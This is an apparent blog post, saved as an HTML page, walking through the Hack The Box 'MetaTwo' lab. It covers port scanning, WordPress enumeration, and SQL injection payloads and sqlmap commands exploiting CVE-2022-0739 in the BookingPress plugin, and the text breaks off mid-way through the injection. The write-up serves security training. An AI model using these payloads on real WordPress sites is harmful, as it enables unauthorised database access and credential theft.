@@ -1,0 +1,691 @@
+<!doctype html><html lang=en-us dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="We leverage CVE-2022-0739 to retrieve password hashes from the database. Once in the admin panel, we utilize CVE-2021-29447 to do a local file disclosure. We disclose the configuration file of WordPress and retrieve the password for the FTP service. From the FTP service, we are able to receive creds to log into the machine.There is a passpie binary whose master password we crack. Finally, we retrieve credentials for the root user."><title>HTB MetaTwo Writeup</title><link rel=canonical href=https://trinuro.github.io/p/htb-metatwo-writeup/><link rel=stylesheet href=/scss/style.min.833d6eed45de56f48306bf57268d5b8cdfc8a60e8e7bdc99810464fcd033f7c6.css><meta property='og:title' content="HTB MetaTwo Writeup"><meta property='og:description' content="We leverage CVE-2022-0739 to retrieve password hashes from the database. Once in the admin panel, we utilize CVE-2021-29447 to do a local file disclosure. We disclose the configuration file of WordPress and retrieve the password for the FTP service. From the FTP service, we are able to receive creds to log into the machine.There is a passpie binary whose master password we crack. Finally, we retrieve credentials for the root user."><meta property='og:url' content='https://trinuro.github.io/p/htb-metatwo-writeup/'><meta property='og:site_name' content="Froginacup's site"><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='HTB'><meta property='article:published_time' content='2026-03-04T21:23:05+08:00'><meta property='article:modified_time' content='2026-03-04T21:23:05+08:00'><meta property='og:image' content='https://trinuro.github.io/p/htb-metatwo-writeup/1.png'><meta name=twitter:title content="HTB MetaTwo Writeup"><meta name=twitter:description content="We leverage CVE-2022-0739 to retrieve password hashes from the database. Once in the admin panel, we utilize CVE-2021-29447 to do a local file disclosure. We disclose the configuration file of WordPress and retrieve the password for the FTP service. From the FTP service, we are able to receive creds to log into the machine.There is a passpie binary whose master password we crack. Finally, we retrieve credentials for the root user."><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content='https://trinuro.github.io/p/htb-metatwo-writeup/1.png'><link rel="shortcut icon" href=/favicon.png></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
+<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/avatar_hu_aff73beef7294c1a.jpg width=300 height=299 class=site-logo loading=lazy alt=Avatar>
+</a><span class=emoji>💡</span></figure><div class=site-meta><h1 class=site-name><a href=/>Froginacup's site</a></h1><h2 class=site-description>A place where Froginacup writes his adventures</h2></div></header><ol class=menu-social><li><a href=https://github.com/trinuro target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
+<span>Home</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
+<span>Archives</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
+<span>Search</span></a></li><li><a href=/projects-and-certificates/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
+<span>Projects and Certificates</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<span>Dark Mode</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table of contents</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#port-scan>Port Scan</a></li><li><a href=#ftp>FTP</a></li><li><a href=#web-application-research>Web Application Research</a></li><li><a href=#sql-injection>SQL Injection</a></li><li><a href=#getting-shell>Getting Shell</a></li><li><a href=#ftp-1>FTP</a></li><li><a href=#shell-as-jnelson>Shell as jnelson</a></li></ol></nav></div></section></aside><main class="main full-width"><article class="has-image main-article"><header class=article-header><div class=article-image><a href=/p/htb-metatwo-writeup/><img src=/p/htb-metatwo-writeup/1_hu_912face5bc0bd8c1.png srcset="/p/htb-metatwo-writeup/1_hu_912face5bc0bd8c1.png 800w, /p/htb-metatwo-writeup/1_hu_d565079164e6973a.png 1600w" width=800 height=800 loading=lazy alt="Featured image of post HTB MetaTwo Writeup"></a></div><div class=article-details><header class=article-category><a href=/categories/htb-writeups/>Htb-Writeups</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/htb-metatwo-writeup/>HTB MetaTwo Writeup</a></h2><h3 class=article-subtitle>We leverage CVE-2022-0739 to retrieve password hashes from the database. Once in the admin panel, we utilize CVE-2021-29447 to do a local file disclosure. We disclose the configuration file of WordPress and retrieve the password for the FTP service. From the FTP service, we are able to receive creds to log into the machine.There is a passpie binary whose master password we crack. Finally, we retrieve credentials for the root user.</h3></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
+<time class=article-time--published datetime=2026-03-04T21:23:05+08:00>Mar 04, 2026</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
+<time class=article-time--reading>9 minute read</time></div></footer></div></header><section class=article-content><h2 id=port-scan>Port Scan</h2><ol><li>TCP Scan</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>sudo nmap -Pn 10.129.228.95 -sS -p- --min-rate 20000 -oN nmap/allTcpPortScan.nmap
+</span></span></code></pre></td></tr></table></div></div><p>Output:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-04 19:23 EST
+</span></span><span class=line><span class=cl>Nmap scan report for 10.129.228.95
+</span></span><span class=line><span class=cl>Host is up (0.077s latency).
+</span></span><span class=line><span class=cl>Not shown: 65532 closed tcp ports (reset)
+</span></span><span class=line><span class=cl>PORT   STATE SERVICE
+</span></span><span class=line><span class=cl>21/tcp open  ftp
+</span></span><span class=line><span class=cl>22/tcp open  ssh
+</span></span><span class=line><span class=cl>80/tcp open  http
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Nmap done: 1 IP address (1 host up) scanned in 7.72 seconds
+</span></span></code></pre></td></tr></table></div></div><ol start=2><li>UDP Scan</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>sudo nmap -Pn 10.129.228.95 -sU -p- --min-rate 20000 -oN nmap/allUdpPortScan.nmap
+</span></span></code></pre></td></tr></table></div></div><p>Output:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-04 19:23 EST
+</span></span><span class=line><span class=cl>Nmap scan report for 10.129.228.95
+</span></span><span class=line><span class=cl>Host is up (0.42s latency).
+</span></span><span class=line><span class=cl>Not shown: 65522 open|filtered udp ports (no-response)
+</span></span><span class=line><span class=cl>PORT      STATE  SERVICE
+</span></span><span class=line><span class=cl>7422/udp  closed unknown
+</span></span><span class=line><span class=cl>23511/udp closed unknown
+</span></span><span class=line><span class=cl>25026/udp closed unknown
+</span></span><span class=line><span class=cl>30973/udp closed unknown
+</span></span><span class=line><span class=cl>35630/udp closed unknown
+</span></span><span class=line><span class=cl>44907/udp closed unknown
+</span></span><span class=line><span class=cl>48514/udp closed unknown
+</span></span><span class=line><span class=cl>48815/udp closed unknown
+</span></span><span class=line><span class=cl>50390/udp closed unknown
+</span></span><span class=line><span class=cl>52732/udp closed unknown
+</span></span><span class=line><span class=cl>56784/udp closed unknown
+</span></span><span class=line><span class=cl>61862/udp closed unknown
+</span></span><span class=line><span class=cl>65046/udp closed unknown
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Nmap done: 1 IP address (1 host up) scanned in 14.30 seconds
+</span></span></code></pre></td></tr></table></div></div><ol start=3><li>Script and Version scan</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>sudo nmap -Pn 10.129.228.95 -sCV -p21,22,80 --min-rate 20000 -oN nmap/scriptVersionScan.nmap
+</span></span></code></pre></td></tr></table></div></div><p>Output:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-04 19:24 EST
+</span></span><span class=line><span class=cl>Stats: 0:01:32 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
+</span></span><span class=line><span class=cl>Service scan Timing: About 66.67% done; ETC: 19:26 (0:00:46 remaining)
+</span></span><span class=line><span class=cl>Nmap scan report for 10.129.228.95
+</span></span><span class=line><span class=cl>Host is up (0.076s latency).
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>PORT   STATE SERVICE VERSION
+</span></span><span class=line><span class=cl>21/tcp open  ftp?
+</span></span><span class=line><span class=cl>22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
+</span></span><span class=line><span class=cl>| ssh-hostkey: 
+</span></span><span class=line><span class=cl>|   3072 c4:b4:46:17:d2:10:2d:8f:ec:1d:c9:27:fe:cd:79:ee (RSA)
+</span></span><span class=line><span class=cl>|   256 2a:ea:2f:cb:23:e8:c5:29:40:9c:ab:86:6d:cd:44:11 (ECDSA)
+</span></span><span class=line><span class=cl>|_  256 fd:78:c0:b0:e2:20:16:fa:05:0d:eb:d8:3f:12:a4:ab (ED25519)
+</span></span><span class=line><span class=cl>80/tcp open  http    nginx 1.18.0
+</span></span><span class=line><span class=cl>|_http-title: Did not follow redirect to http://metapress.htb/
+</span></span><span class=line><span class=cl>|_http-server-header: nginx/1.18.0
+</span></span><span class=line><span class=cl>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span></code></pre></td></tr></table></div></div><h2 id=ftp>FTP</h2><ol><li>FTP is very slow for some reason</li><li>Anonymous login is not allowed.</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>ftp 10.129.228.95
+</span></span></code></pre></td></tr></table></div></div><p>Output:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>220 ProFTPD Server (Debian) [::ffff:10.129.228.95]
+</span></span><span class=line><span class=cl>Name (10.129.228.95:kali): anonymous
+</span></span><span class=line><span class=cl>331 Password required for anonymous
+</span></span><span class=line><span class=cl>Password: 
+</span></span><span class=line><span class=cl>530 Login incorrect.
+</span></span></code></pre></td></tr></table></div></div><h2 id=web-application-research>Web Application Research</h2><ol><li>Add this domain to <code>/etc/hosts</code></li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>10.129.228.95 metapress.htb
+</span></span></code></pre></td></tr></table></div></div><ol start=2><li>It is a Wordpress Site
+<img src=/p/htb-metatwo-writeup/HTB-MetaTwo-1.png width=2394 height=1390 srcset="/p/htb-metatwo-writeup/HTB-MetaTwo-1_hu_8f2f9e7d3d3ce052.png 480w, /p/htb-metatwo-writeup/HTB-MetaTwo-1_hu_15a6476bc68a61b7.png 1024w" loading=lazy alt=HTB-MetaTwo-1.png class=gallery-image data-flex-grow=172 data-flex-basis=413px></li><li>Let&rsquo;s use WPScan</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>sudo</span> <span class=n>wpscan</span> <span class=o>--</span><span class=n>url</span> <span class=n>http</span><span class=p>:</span><span class=o>//</span><span class=n>metapress</span><span class=o>.</span><span class=n>htb</span><span class=o>/</span> <span class=o>--</span><span class=n>enumerate</span> <span class=o>|</span> <span class=n>tee</span>  <span class=n>wpscan</span><span class=o>.</span><span class=n>txt</span>
+</span></span></code></pre></td></tr></table></div></div><p>Output:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>[+] WordPress version 5.6.2 identified (Insecure, released on 2021-02-22).
+</span></span><span class=line><span class=cl> | Found By: Rss Generator (Passive Detection)
+</span></span><span class=line><span class=cl> |  - http://metapress.htb/feed/, &lt;generator&gt;https://wordpress.org/?v=5.6.2&lt;/generator&gt;
+</span></span><span class=line><span class=cl> |  - http://metapress.htb/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=5.6.2&lt;/generator&gt;
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>[i] User(s) Identified:
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>[+] admin
+</span></span><span class=line><span class=cl> | Found By: Author Posts - Author Pattern (Passive Detection)
+</span></span><span class=line><span class=cl> | Confirmed By:
+</span></span><span class=line><span class=cl> |  Rss Generator (Passive Detection)
+</span></span><span class=line><span class=cl> |  Wp Json Api (Aggressive Detection)
+</span></span><span class=line><span class=cl> |   - http://metapress.htb/wp-json/wp/v2/users/?per_page=100&amp;page=1
+</span></span><span class=line><span class=cl> |  Rss Generator (Aggressive Detection)
+</span></span><span class=line><span class=cl> |  Author Sitemap (Aggressive Detection)
+</span></span><span class=line><span class=cl> |   - http://metapress.htb/wp-sitemap-users-1.xml
+</span></span><span class=line><span class=cl> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+</span></span><span class=line><span class=cl> |  Login Error Messages (Aggressive Detection)
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>[+] manager
+</span></span><span class=line><span class=cl> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+</span></span><span class=line><span class=cl> | Confirmed By: Login Error Messages (Aggressive Detection)
+</span></span></code></pre></td></tr></table></div></div><ol start=4><li>Directory fuzzing</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>ffuf -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://metapress.htb/FUZZ -ic -o root_dir_fuzz.txt
+</span></span></code></pre></td></tr></table></div></div><ol start=5><li>Subdomain fuzzing</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>ffuf -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://metapress.htb -H &#34;Host:FUZZ.metapress.htb&#34;
+</span></span></code></pre></td></tr></table></div></div><ul><li>Nothing</li></ul><ol start=6><li>WP Scan shows no plugins but I can see one from the Burp Suite history</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=err>http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/readme.txt
+</span></span></span></code></pre></td></tr></table></div></div><p>Output:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>== Changelog ==
+</span></span><span class=line><span class=cl>= 1.0.10 =
+</span></span><span class=line><span class=cl>* Minor bug fixes and improvements
+</span></span><span class=line><span class=cl>= 1.0.9 =
+</span></span><span class=line><span class=cl>* Minor bug fixes
+</span></span></code></pre></td></tr></table></div></div><ol start=7><li>It is vulnerable to an <a class=link href="https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357/#:~:text=BookingPress%20%3C%201.0.,CVE%202022%2D0739%20%7C%20Plugin%20Vulnerabilities" target=_blank rel=noopener>unauthenticated SQL Injection vulnerability, CVE-2022-0739</a></li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/wp-admin/admin-ajax.php</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=g>Host: metapress.htb
+</span></span></span><span class=line><span class=cl><span class=g>
+</span></span></span><span class=line><span class=cl><span class=g>action=bookingpress_front_get_category_services&amp;_wpnonce=8a84dd7273&amp;category_id=33&amp;total_service=-7502)+UNION+ALL+SELECT+%40%40version,%40%40version_comment,%40%40version_compile_os,1,2,3,4,5,6--+-
+</span></span></span></code></pre></td></tr></table></div></div><p>Output:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=p>[{</span><span class=nt>&#34;bookingpress_service_id&#34;</span><span class=p>:</span><span class=s2>&#34;10.5.15-MariaDB-0+deb11u1&#34;</span><span class=p>,</span><span class=nt>&#34;bookingpress_category_id&#34;</span><span class=p>:</span><span class=s2>&#34;Debian 11&#34;</span><span class=p>,</span><span class=nt>&#34;bookingpress_service_name&#34;</span><span class=p>:</span><span class=s2>&#34;debian-linux-gnu&#34;</span><span class=p>,</span><span class=nt>&#34;bookingpress_service_price&#34;</span><span class=p>:</span><span class=s2>&#34;$1.00&#34;</span><span class=p>,</span><span class=nt>&#34;bookingpress_service_duration_val&#34;</span><span class=p>:</span><span class=s2>&#34;2&#34;</span><span class=p>,</span><span class=nt>&#34;bookingpress_service_duration_unit&#34;</span><span class=p>:</span><span class=s2>&#34;3&#34;</span><span class=p>,</span><span class=nt>&#34;bookingpress_service_description&#34;</span><span class=p>:</span><span class=s2>&#34;4&#34;</span><span class=p>,</span><span class=nt>&#34;bookingpress_service_position&#34;</span><span class=p>:</span><span class=s2>&#34;5&#34;</span><span class=p>,</span><span class=nt>&#34;bookingpress_servicedate_created&#34;</span><span class=p>:</span><span class=s2>&#34;6&#34;</span><span class=p>,</span><span class=nt>&#34;service_price_without_currency&#34;</span><span class=p>:</span><span class=mi>1</span><span class=p>,</span><span class=nt>&#34;img_url&#34;</span><span class=p>:</span><span class=s2>&#34;http:\/\/metapress.htb\/wp-content\/plugins\/bookingpress-appointment-booking\/images\/placeholder-img.jpg&#34;</span><span class=p>}]</span>
+</span></span></code></pre></td></tr></table></div></div><ol start=8><li>Let&rsquo;s see if SQLMap can dump all tables</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>sqlmap -u &#39;http://metapress.htb/wp-admin/admin-ajax.php&#39; --data &#39;action=bookingpress_front_get_category_services&amp;_wpnonce=8a84dd7273&amp;category_id=33&amp;total_service=VULN*&#39; --dbms mysql --risk=2 --level=5
+</span></span></code></pre></td></tr></table></div></div><h2 id=sql-injection>SQL Injection</h2><ol><li>Let&rsquo;s see what databases are available</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=o>-</span><span class=mi>7502</span><span class=p>)</span><span class=w> </span><span class=k>UNION</span><span class=w> </span><span class=k>ALL</span><span class=w> </span><span class=k>SELECT</span><span class=w> </span><span class=n>group_concat</span><span class=p>(</span><span class=n>table_schema</span><span class=p>),</span><span class=mi>1</span><span class=p>,</span><span class=mi>2</span><span class=p>,</span><span class=mi>1</span><span class=p>,</span><span class=mi>2</span><span class=p>,</span><span class=mi>3</span><span class=p>,</span><span class=mi>4</span><span class=p>,</span><span class=mi>5</span><span class=p>,</span><span class=mi>6</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>INFORMATION_SCHEMA</span><span class=p>.</span><span class=n>TABLES</span><span class=c1>-- -
+</span></span></span></code></pre></td></tr></table></div></div><p>Payload:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>action=bookingpress_front_get_category_services&amp;_wpnonce=8a84dd7273&amp;category_id=33&amp;total_service=-7502)+UNION+ALL+SELECT+group_concat(table_schema),1,2,1,2,3,4,5,6+FROM+INFORMATION_SCHEMA.TABLES--+-
+</span></span></code></pre></td></tr></table></div></div><p>Output:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>blog
+</span></span><span class=line><span class=cl>information_schema
+</span></span></code></pre></td></tr></table></div></div><ol start=2><li>Time to leak table names</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>action=bookingpress_front_get_category_services&amp;_wpnonce=8a84dd7273&amp;category_id=33&amp;total_service=-7502)+UNION+ALL+SELECT+GROUP_CONCAT(table_name),1,2,1,2,3,4,5,6+FROM+INFORMATION_SCHEMA.TABLES--+-
+</span></span></code></pre></td></tr></table></div></div><p>Output:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
